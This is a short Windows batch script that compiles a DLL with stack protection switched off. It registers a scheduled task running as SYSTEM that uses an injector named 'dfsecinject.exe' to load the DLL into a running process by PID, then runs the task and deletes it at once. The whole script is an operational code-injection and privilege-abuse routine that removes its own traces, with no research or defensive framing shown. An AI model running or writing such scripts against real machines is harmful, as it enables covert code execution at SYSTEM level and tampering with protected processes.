@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfsquad.cpp /Fe:dfsquad.dll /link user32.lib > squad_build.log 2>&1
echo SQ=%errorlevel%
type squad_build.log
schtasks /create /tn dfa_sq /tr "C:\Users\User\trackA\dfsecinject.exe 50552 C:\Users\User\trackA\dfsquad.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_sq
ping -n 6 127.0.0.1 >nul
schtasks /delete /tn dfa_sq /f >nul
type squad.txt
